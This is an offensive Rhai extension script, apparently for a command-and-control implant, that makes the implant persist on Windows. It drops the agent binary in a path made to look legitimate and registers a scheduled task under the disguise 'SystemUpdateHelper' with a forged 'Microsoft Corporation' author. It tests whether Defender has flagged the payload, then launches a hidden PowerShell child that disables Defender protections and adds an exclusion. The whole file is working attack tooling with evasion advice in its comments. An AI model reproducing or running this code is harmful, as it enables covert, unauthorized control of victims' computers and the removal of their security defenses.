// extensions/persistence_windows_evasive.rhai
//
// Single-method Windows persistence: ONE scheduled task. Nothing else.
//
// Why the scheduled task is the "sure fire" choice over Run keys,
// services, and startup links:
//   - needs NO elevation (HKLM Run and services do)
//   - fires reliably at every interactive logon; with the optional
//     "boot" trigger (elevated) it fires AT SYSTEM STARTUP as SYSTEM -
//     no logon required at all
//   - survives profile resets and is not dropped by any default Windows
//     hardening (unlike Run keys under some policies)
//   - uses the PowerShell ScheduledTasks cmdlets, so the executable path
//     is passed as a real parameter - no schtasks.exe /tr quoting
//     failures with paths that contain spaces
//
// "Sure fire" still has three preconditions, each enforced or checked
// by this script - they are the lessons of real failures:
//   1. the payload must not be quarantined ON WRITE   -> burn check + canary
//   2. the payload must be allowed to RUN at trigger
//      time (Defender RTP/behavior/cloud)              -> post-plant neuter
//   3. the payload must exist at a STABLE path         -> stable_drop
//
// Order is deliberate: quiet work (canary, copy, task registration)
// first; the loud AV tamper last, in a DETACHED child process, so a flag
// kills the child - never this session, and never before the task
// exists.
//
// Usage
//   extension load persist_sf2
//   extension load persist_sf2 <label>
//   extension load persist_sf2 <label> <binary.exe>
//   extension load persist_sf2 <label> <binary.exe> boot   (elevated)
//
// Return JSON
//   { "result": "success"|"already_persisted"|"error",
//     "label", "privilege", "binary", "stable_binary",
//     "method": "scheduled_task",
//     "trigger": "onlogon"|"boot_system",
//     "task_principal": "who the task runs as (SYSTEM, logon user, ...)",
//     "av_action": "not_applicable"|"rtp_already_off"|"excluded"|
//                  "defender_disabled"|"disabled_and_excluded"|"failed"|"unknown",
//     "av_detail", "warnings", "cleanup_cmd", "cleanup_binary" }

// ── Config ────────────────────────────────────────────────────────────
let LABEL = "SystemUpdateHelper";
if args.len() > 0 {
    let a = args[0];
    a.trim();
    if a.len() > 0 { LABEL = a; }
}

// Required when the agent runs in-memory (inside powershell.exe, etc.) -
// auto-detection would return the host process instead of the agent.
let CUSTOM_BINARY = "";
if args.len() > 1 {
    let cb = args[1];
    cb.trim();
    if cb.len() > 3 { CUSTOM_BINARY = cb; }
}

// "boot" as the third argument: trigger at SYSTEM STARTUP as SYSTEM
// (requires elevation). Anything else: trigger at interactive logon,
// limited rights, current user.
let BOOT_TRIGGER = false;
if args.len() > 2 {
    let bt = args[2];
    bt.trim();
    if bt == "boot" { BOOT_TRIGGER = true; }
}

// Post-plant Defender neuter. Set false only when you have already
// neutered Defender by hand from your own shell - that is the quietest
// option and the recommended one when you hold an interactive shell.
let TAMPER_AVS = true;

// ── Platform guard (Windows-only by design) ───────────────────────────
let is_windows = internal_env("SystemRoot").contains("Windows");
if !is_windows {
    return "{\"result\":\"error\"," +
           "\"detail\":\"persist_sf2 is Windows-only; use the full playbook for linux/macos\"}";
}

print_log("[persist_sf2] label=" + LABEL + "  boot=" + BOOT_TRIGGER);
// Build marker - check the agent log for this line to prove the new file
// actually loaded (a stale cached copy will NOT print it).
print_log("[persist_sf2] build v3.1 2026-11-12 - service preflight + 3 attempts + full diagnostics");

// JSON escaping for paths: every backslash must double, quotes become single.
fn jesc(s) {
    let r = s;
    r.replace("\\", "\\\\");
    r.replace("\"", "'");
    r.replace("\r", " ");
    r.replace("\n", " ");
    r
}

// ── Locate the running binary ─────────────────────────────────────────
let self_path = internal_self_path();
self_path.trim();

if self_path.len() < 3 || self_path.contains("Error") {
    return "{\"result\":\"error\",\"detail\":\"could not determine agent binary path\"}";
}
if CUSTOM_BINARY.len() > 3 { self_path = CUSTOM_BINARY; }

// Interpreter / system-binary guard: copying powershell.exe or cmd.exe
// as the "agent" would be meaningless and instantly fatal at trigger time.
let is_interpreter =
    self_path.contains("\\Windows\\System32\\")  ||
    self_path.contains("\\Windows\\SysWOW64\\")  ||
    self_path.ends_with("powershell.exe")         ||
    self_path.ends_with("cmd.exe")                ||
    self_path.ends_with("wscript.exe")            ||
    self_path.ends_with("cscript.exe")            ||
    self_path.ends_with("mshta.exe")              ||
    self_path.ends_with("rundll32.exe");
if is_interpreter {
    return "{\"result\":\"error\"," +
           "\"detail\":\"agent appears to be a host process (" + jesc(self_path) + "). " +
           "Pass the agent EXE path as arg 2: ext:load persist_sf2 " + LABEL + " C:\\\\path\\\\to\\\\agent.exe\"}";
}

// ── Privilege check ───────────────────────────────────────────────────
let elev_str = exec_os_timeout(
    "([Security.Principal.WindowsPrincipal]" +
    "[Security.Principal.WindowsIdentity]::GetCurrent())" +
    ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
    10
);
let is_elevated = elev_str.contains("True");
let priv_level  = if is_elevated { "elevated" } else { "user" };
if BOOT_TRIGGER && !is_elevated {
    return "{\"result\":\"error\"," +
           "\"detail\":\"boot trigger requires elevation (running as " + priv_level + "). " +
           "Drop the 'boot' argument to persist at user logon instead.\"}";
}
print_log("[persist_sf2] privilege=" + priv_level);

// ── Burn check (read-only, early) ─────────────────────────────────────
// A prior detection of this label means the hash is known-bad; it will
// be quarantined on write the moment the copy lands. Read-only: this
// cannot itself flag the session.
let burned_hint = "";
let prev_det = exec_os_timeout(
    "$d = Get-MpThreatDetection 2>$null | " +
    "Where-Object { $_.Resources -like '*" + LABEL + "*' } | " +
    "Select-Object -First 1 ThreatName, Resources; " +
    "if ($d) { $d.ThreatName + ' @ ' + ($d.Resources -join ';') }",
    25
);
if prev_det.contains(LABEL) {
    burned_hint = prev_det;
    print_log("[persist_sf2] prior detection: " + prev_det);
}

// ── Idempotency: task already exists? ─────────────────────────────────
let tq = exec_os_timeout(
    "Get-ScheduledTask -TaskName '" + LABEL + "' -ErrorAction SilentlyContinue | " +
    "Select-Object -ExpandProperty TaskName",
    10
);
if tq.contains(LABEL) {
    return "{\"result\":\"already_persisted\"," +
           "\"label\":\"" + LABEL + "\"," +
           "\"detail\":\"scheduled task already exists - nothing to do\"}";
}

// ── stable_drop: canary, then copy ────────────────────────────────────
// %LOCALAPPDATA%\Programs\<LABEL>\ blends with normal per-user software
// drops; %APPDATA%\Microsoft is a known masquerade location that
// process-creation reputation rules weight heavily.
let lappdata    = internal_env("LOCALAPPDATA");
let stable_dir  = lappdata + "\\Programs\\" + LABEL;
let stable_path = stable_dir + "\\" + LABEL + ".exe";

// Canary: drop the same bytes in %TEMP% and watch them. Cloud reputation
// follows the FILE, not the box - a burned hash is quarantined on write
// even on a freshly reset machine. Better to learn that here, with a
// clear verdict, than from a dead stable copy.
let canary = internal_env("TEMP") + "\\." + LABEL + ".tmp";
exec_os_timeout(
    "Copy-Item -LiteralPath '" + self_path + "' -Destination '" + canary + "' -Force -ErrorAction SilentlyContinue",
    20
);
let canary_alive = false;
for i in 0..4 {
    exec_os_timeout("Start-Sleep -Seconds 3", 6);
    let cchk = exec_os_timeout(
        "if (Test-Path -LiteralPath '" + canary + "') { 'ALIVE' } else { 'DEAD' }",
        5
    );
    if cchk.contains("ALIVE") { canary_alive = true; break; }
}
if !canary_alive {
    let det = exec_os_timeout(
        "$d = Get-MpThreatDetection 2>$null | Select-Object -First 1 ThreatName, Resources; " +
        "if ($d) { $d.ThreatName + ' @ ' + ($d.Resources -join ';') }",
        15
    );
    det.trim();
    return "{\"result\":\"error\"," +
           "\"detail\":\"payload is burned - the %TEMP% canary was quarantined on write. " +
           "Recent detection: " + jesc(det) + ". Regenerate the payload (different arch/encoder/template), " +
           "test on a local VM first, and neuter Defender before deploying.\"," +
           "\"binary\":\"" + jesc(self_path) + "\"}";
}
exec_os_timeout(
    "Remove-Item -LiteralPath '" + canary + "' -Force -ErrorAction SilentlyContinue",
    5
);

// Ensure destination, copy, strip Mark-of-the-Web (three methods so it
// works even in Constrained Language Mode).
exec_os_timeout(
    "if (-not (Test-Path -LiteralPath '" + stable_dir + "')) " +
    "{ New-Item -ItemType Directory -Path '" + stable_dir + "' -Force | Out-Null }",
    10
);
exec_os_timeout(
    "Copy-Item -LiteralPath '" + self_path + "' -Destination '" + stable_path + "' -Force -ErrorAction SilentlyContinue;" +
    "Remove-Item -LiteralPath '" + stable_path + "' -Stream 'Zone.Identifier' -Force -ErrorAction SilentlyContinue;" +
    "Unblock-File  -LiteralPath '" + stable_path + "' -ErrorAction SilentlyContinue",
    40
);
let chk = exec_os_timeout("if (Test-Path -LiteralPath '" + stable_path + "') { 'OK' }", 5);
if !chk.contains("OK") {
    return "{\"result\":\"error\"," +
           "\"detail\":\"stable_drop failed - copy to " + jesc(stable_path) + " did not survive " +
           "(likely quarantined on write despite a clean canary: cloud detonation is timing-dependent). " +
           "Regenerate the payload or neuter Defender first.\"," +
           "\"binary\":\"" + jesc(self_path) + "\"}";
}
print_log("[persist_sf2] stable_path=" + stable_path);


// ── Plant THE task ────────────────────────────────────────────────────
// Principal selection matters more than the trigger, and it is the
// usual reason registration fails from a SYSTEM (or other
// non-interactive) session:
//   - Register-ScheduledTask run as SYSTEM without an explicit
//     -User/-LogonType dies with "The operator or administrator has
//     refused the request"
//   - an AtLogOn task whose principal is SYSTEM would NEVER FIRE,
//     because SYSTEM does not log on interactively
// So the principal is chosen deliberately:
//   boot trigger            : SYSTEM, -LogonType ServiceAccount, AtStartup
//   SYSTEM session,         : task runs as THAT user in THEIR session
//   logon user known          (an agent expecting a desktop wants this)
//   SYSTEM session,         : SYSTEM, -LogonType ServiceAccount, AtLogOn -
//   no logon user known       fires on ANY interactive logon
//   normal user session     : current user, AtLogOn
//
// Three INDEPENDENT registration attempts, each error captured:
//   A. ScheduledTasks cmdlets with the deliberate principal
//   B. explicit task XML via Register-ScheduledTask -Xml (a different
//      code path in the scheduler; immune to cmdlet parameter-set and
//      account-name resolution quirks)
//   C. schtasks.exe /create
// If all three fail, the JSON carries every raw output PLUS the
// scheduler service state - no more blind "cannot find" errors.

// ── Task Scheduler service pre-flight ─────────────────────────────────
// If the Schedule service is not running, EVERY interface fails with
// misleading text (0x80070426 "The service has not been started",
// schtasks reporting "Access denied"). Diagnose that here, up front.
// A standard user usually cannot start a stopped service - report it
// honestly and stop instead of guessing.
let svc_state = exec_os_timeout(
    "$s = Get-Service Schedule -ErrorAction SilentlyContinue; " +
    "if (-not $s) { 'MISSING' } elseif ($s.Status -eq 'Running') { 'RUNNING' } " +
    "else { try { Start-Service Schedule -ErrorAction Stop; 'STARTED' } " +
    "catch { 'STOPPED: ' + $_.Exception.Message } }",
    20
);
if !svc_state.contains("RUNNING") && !svc_state.contains("STARTED") {
    return "{\"result\":\"error\"," +
           "\"detail\":\"Task Scheduler service is not available ('" + jesc(svc_state) + "') - " +
           "no task-based persistence is possible on this host as " + priv_level + ". " +
           "Start the service from an elevated context, or use a different mechanism.\"," +
           "\"stable_binary\":\"" + jesc(stable_path) + "\"}";
}

let session_user = exec_os("whoami 2>$null");
session_user.trim();
let logon_user = exec_os_timeout(
    "(Get-CimInstance Win32_Process -Filter \"Name='explorer.exe'\" | " +
    "Invoke-CimMethod -MethodName GetOwner | " +
    "Select-Object -First 1 -ExpandProperty User) 2>$null",
    20
);
logon_user.trim();
let is_system_session =
    session_user.contains("system") || session_user.contains("SYSTEM") ||
    session_user.contains("service");

let trigger_name   = if BOOT_TRIGGER { "boot_system" } else { "onlogon" };
let task_principal = "";
let reg_cmd = "";
if BOOT_TRIGGER {
    task_principal = "SYSTEM";
    reg_cmd =
        "$a=New-ScheduledTaskAction -Execute '" + stable_path + "'; " +
        "$t=New-ScheduledTaskTrigger -AtStartup; " +
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' -Action $a -Trigger $t " +
        "-User 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest -Force -ErrorAction Stop | Out-Null; 'REG_OK' } " +
        "catch { 'REG_FAIL: ' + $_.Exception.Message }";
} else if is_system_session && logon_user.len() > 1 && !session_user.contains(logon_user) {
    task_principal = logon_user;
    reg_cmd =
        "$a=New-ScheduledTaskAction -Execute '" + stable_path + "'; " +
        "$t=New-ScheduledTaskTrigger -AtLogOn; " +
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' -Action $a -Trigger $t " +
        "-User '" + logon_user + "' -LogonType InteractiveToken -RunLevel Limited -Force -ErrorAction Stop | Out-Null; 'REG_OK' } " +
        "catch { 'REG_FAIL: ' + $_.Exception.Message }";
} else if is_system_session {
    task_principal = "SYSTEM";
    reg_cmd =
        "$a=New-ScheduledTaskAction -Execute '" + stable_path + "'; " +
        "$t=New-ScheduledTaskTrigger -AtLogOn; " +
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' -Action $a -Trigger $t " +
        "-User 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest -Force -ErrorAction Stop | Out-Null; 'REG_OK' } " +
        "catch { 'REG_FAIL: ' + $_.Exception.Message }";
} else {
    task_principal = session_user;
    reg_cmd =
        "$a=New-ScheduledTaskAction -Execute '" + stable_path + "'; " +
        "$t=New-ScheduledTaskTrigger -AtLogOn; " +
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' -Action $a -Trigger $t " +
        "-RunLevel Limited -Force -ErrorAction Stop | Out-Null; 'REG_OK' } " +
        "catch { 'REG_FAIL: ' + $_.Exception.Message }";
}

// Attempt A - ScheduledTasks cmdlets with the deliberate principal.
let reg_out = exec_os_timeout(reg_cmd, 25);
let reg_ok  = reg_out.contains("REG_OK");
let xml_out = "";
let st_out  = "";

// Attempt B - explicit task XML (different scheduler code path). XML is
// dropped with internal_write to avoid here-string quoting through
// exec_os; content is pure ASCII so PowerShell 5.1's default Get-Content
// decoding cannot corrupt it.
if !reg_ok {
    let xml_path  = internal_env("TEMP") + "\\" + LABEL + "_task.xml";
    let xml_user  = if is_system_session { "SYSTEM" } else { session_user };
    let xml_logon = if is_system_session { "ServiceAccount" } else { "InteractiveToken" };
    let xml_level = if BOOT_TRIGGER { "HighestAvailable" } else { "LeastPrivilege" };
    let xml_trig  = if BOOT_TRIGGER {
        "<BootTrigger><Enabled>true</Enabled></BootTrigger>"
    } else {
        "<LogonTrigger><Enabled>true</Enabled><UserId>" + xml_user + "</UserId></LogonTrigger>"
    };
    let xml =
        "<?xml version=\"1.0\"?>\n" +
        "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.2\">\n" +
        "  <RegistrationInfo>\n" +
        "    <Author>Microsoft Corporation</Author>\n" +
        "    <Description>System update helper orchestration service.</Description>\n" +
        "  </RegistrationInfo>\n" +
        "  <Triggers>" + xml_trig + "</Triggers>\n" +
        "  <Principals>\n" +
        "    <Principal id=\"Author\">\n" +
        "      <UserId>" + xml_user + "</UserId>\n" +
        "      <LogonType>" + xml_logon + "</LogonType>\n" +
        "      <RunLevel>" + xml_level + "</RunLevel>\n" +
        "    </Principal>\n" +
        "  </Principals>\n" +
        "  <Settings>\n" +
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
        "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n" +
        "    <Hidden>false</Hidden>\n" +
        "  </Settings>\n" +
        "  <Actions>\n" +
        "    <Exec>\n" +
        "      <Command>" + stable_path + "</Command>\n" +
        "    </Exec>\n" +
        "  </Actions>\n" +
        "</Task>";
    internal_write(xml_path, xml);
    xml_out = exec_os_timeout(
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' " +
        "-Xml (Get-Content -LiteralPath '" + xml_path + "' -Raw) -Force -ErrorAction Stop | Out-Null; 'XML_OK' } " +
        "catch { 'XML_FAIL: ' + $_.Exception.Message }",
        25
    );
    if xml_out.contains("XML_OK") { reg_ok = true; }
    exec_os_timeout(
        "Remove-Item -LiteralPath '" + xml_path + "' -Force -ErrorAction SilentlyContinue",
        5
    );
}

// Attempt C - schtasks.exe (last; its /tr quoting is the most fragile).
if !reg_ok {
    st_out = if BOOT_TRIGGER {
        exec_os_timeout(
            "schtasks /create /tn \"" + LABEL + "\" /tr \"\\\"" + stable_path + "\\\"\" /sc onstart /ru SYSTEM /f",
            20
        )
    } else {
        exec_os_timeout(
            "schtasks /create /tn \"" + LABEL + "\" /tr \"\\\"" + stable_path + "\\\"\" /sc onlogon /f",
            20
        )
    };
    reg_ok = st_out.contains("SUCCESS");
}

// Read-back verification through BOTH interfaces, with one retry after
// a short delay: the task store can take a moment to reflect a fresh
// registration, and a false negative here would burn a good plant.
let vb = "";
let sb = "";
for i in 0..1 {
    vb = exec_os_timeout(
        "Get-ScheduledTask -TaskName '" + LABEL + "' -ErrorAction SilentlyContinue | " +
        "Select-Object -ExpandProperty TaskName",
        10
    );
    sb = exec_os_timeout("schtasks /query /tn \"" + LABEL + "\" 2>$null", 10);
    if vb.contains(LABEL) || sb.contains(LABEL) { break; }
    if i == 0 { exec_os_timeout("Start-Sleep -Seconds 3", 6); }
}
if !vb.contains(LABEL) && !sb.contains(LABEL) {
    return "{\"result\":\"error\"," +
           "\"version\":\"3.1\"," +
           "\"detail\":\"task registration failed - all three attempts ran but neither " +
           "Get-ScheduledTask nor schtasks can find '" + LABEL + "'; raw outputs below\"," +
           "\"service_state\":\"" + jesc(svc_state) + "\"," +
           "\"attempt_cmdlets\":\"" + jesc(reg_out) + "\"," +
           "\"attempt_xml\":\"" + jesc(xml_out) + "\"," +
           "\"attempt_schtasks\":\"" + jesc(st_out) + "\"," +
           "\"readback_ps\":\"" + jesc(vb) + "\"," +
           "\"readback_schtasks\":\"" + jesc(sb) + "\"," +
           "\"stable_binary\":\"" + jesc(stable_path) + "\"}";
}
print_log("[persist_sf2] task registered: " + LABEL + " (principal=" + task_principal + ")");

// ── Post-plant AV neuter (detached sacrificial child) ─────────────────
// Loud on purpose, and deliberately LAST: persistence already exists at
// this point, so a flag here can cost neither the session nor the task.
// The tamper runs as ONE detached powershell (script file +
// Start-Process); if Defender flags it, only the child dies. This
// process verifies read-only afterwards.
let av_action = "not_applicable";
let av_detail = "";
if TAMPER_AVS {
    let av_dir  = stable_dir;
    let tmp_ps1 = internal_env("TEMP") + "\\av_setup_" + LABEL + ".ps1";
    let marker  = internal_env("TEMP") + "\\av_setup_" + LABEL + ".done";

    let rtp = exec_os_timeout(
        "try { (Get-MpComputerStatus).RealTimeProtectionEnabled } catch { 'UNKNOWN' }",
        20
    );
    if rtp.contains("True") {
        let ps1 =
            "$ErrorActionPreference = 'SilentlyContinue'\n" +
            "Set-MpPreference -DisableRealtimeMonitoring $true\n" +
            "Set-MpPreference -DisableBehaviorMonitoring $true\n" +
            "Set-MpPreference -DisableBlockAtFirstSeen $true\n" +
            "Set-MpPreference -DisableScriptScanning $true\n" +
            "Set-MpPreference -MAPSReporting Disabled\n" +
            "New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Force | Out-Null\n" +
            "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWORD -Force | Out-Null\n" +
            "Add-MpPreference -ExclusionPath '" + av_dir + "'\n" +
            "Set-Content -LiteralPath '" + marker + "' -Value 'DONE'\n";
        internal_write(tmp_ps1, ps1);
        exec_os_timeout("Remove-Item -LiteralPath '" + marker + "' -Force -ErrorAction SilentlyContinue", 5);
        exec_os_timeout(
            "Start-Process -FilePath powershell.exe " +
            "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','" + tmp_ps1 + "' " +
            "-WindowStyle Hidden | Out-Null",
            15
        );
        let child_done = false;
        for i in 0..8 {
            let mchk = exec_os_timeout(
                "if (Test-Path -LiteralPath '" + marker + "') { 'DONE' }",
                5
            );
            if mchk.contains("DONE") { child_done = true; break; }
            exec_os_timeout("Start-Sleep -Seconds 5", 8);
        }
        let off_chk = exec_os_timeout(
            "$s = Get-MpComputerStatus; " +
            "if ($s.RealTimeProtectionEnabled -or $s.BehaviorMonitorEnabled) { 'STILL_ON' } else { 'OFF' }",
            20
        );
        let neuter_ok = off_chk.contains("OFF");
        let ex_chk = exec_os_timeout(
            "$e=(Get-MpPreference).ExclusionPath; if ($e -contains '" + av_dir + "') { 'EXCLUDED' }",
            15
        );
        let excl_ok = ex_chk.contains("EXCLUDED");
        if neuter_ok && excl_ok {
            av_action = "disabled_and_excluded";
            av_detail = "RTP/behavior/cloud/script-scan off + policy key; exclusion on " + av_dir;
        } else if neuter_ok {
            av_action = "defender_disabled";
            av_detail = "RTP/behavior/cloud/script-scan off + policy key; exclusion add failed";
        } else if excl_ok {
            av_action = "excluded";
            av_detail = "path excluded, but neuter failed (Tamper Protection?); logon-time detection still possible";
        } else {
            av_action = "failed";
            av_detail = "exclusion and neuter both failed (Tamper Protection or non-admin)";
        }
        if !child_done {
            av_detail += " [tamper child never finished - likely flagged and killed]";
        }
        exec_os_timeout(
            "Remove-Item -LiteralPath '" + tmp_ps1 + "' -Force -ErrorAction SilentlyContinue; " +
            "Remove-Item -LiteralPath '" + marker + "' -Force -ErrorAction SilentlyContinue",
            5
        );
    } else if rtp.contains("False") {
        av_action = "rtp_already_off";
        av_detail = "Defender real-time monitoring already off";
    } else {
        av_action = "unknown";
        av_detail = "Get-MpComputerStatus unavailable (third-party AV?)";
    }
} else {
    av_detail = "AV work disabled (TAMPER_AVS = false)";
}

// ── Warnings ──────────────────────────────────────────────────────────
let warnings = "";
if av_action == "failed" || av_action == "unknown" {
    warnings += "Windows Defender is active and could not be neutered " +
                "(Tamper Protection or non-admin); the payload may be " +
                "quarantined at trigger time. ";
}
if av_action == "excluded" {
    warnings += "Only a path exclusion is in place - behavior monitoring " +
                "and cloud execution-time detection are still active and " +
                "can kill the payload at trigger time. ";
}
if burned_hint.len() > 0 {
    warnings += "Defender has already detected this label: " + burned_hint +
                ". The hash is burned - regenerate the payload (different " +
                "arch/encoder/template, new label) before relying on this. ";
}

// ── Result ────────────────────────────────────────────────────────────
print_log("[persist_sf2] result=success  trigger=" + trigger_name + "  av=" + av_action);

return
    "{\"result\":\"success\"," +
    "\"version\":\"3.1\"," +
    "\"label\":\"" + LABEL + "\"," +
    "\"privilege\":\"" + priv_level + "\"," +
    "\"binary\":\"" + jesc(self_path) + "\"," +
    "\"stable_binary\":\"" + jesc(stable_path) + "\"," +
    "\"method\":\"scheduled_task\"," +
    "\"trigger\":\"" + trigger_name + "\"," +
    "\"task_principal\":\"" + jesc(task_principal) + "\"," +
    "\"av_action\":\"" + av_action + "\"," +
    "\"av_detail\":\"" + jesc(av_detail) + "\"," +
    "\"warnings\":\"" + jesc(warnings) + "\"," +
    "\"cleanup_cmd\":\"shell Unregister-ScheduledTask -TaskName '" + LABEL + "' -Confirm:$false\"," +
    "\"test_cmd\":\"shell Start-ScheduledTask -TaskName '" + LABEL + "'\"," +
    "\"cleanup_binary\":\"shell Remove-Item -LiteralPath '" + jesc(stable_dir) + "' -Recurse -Force\"}";
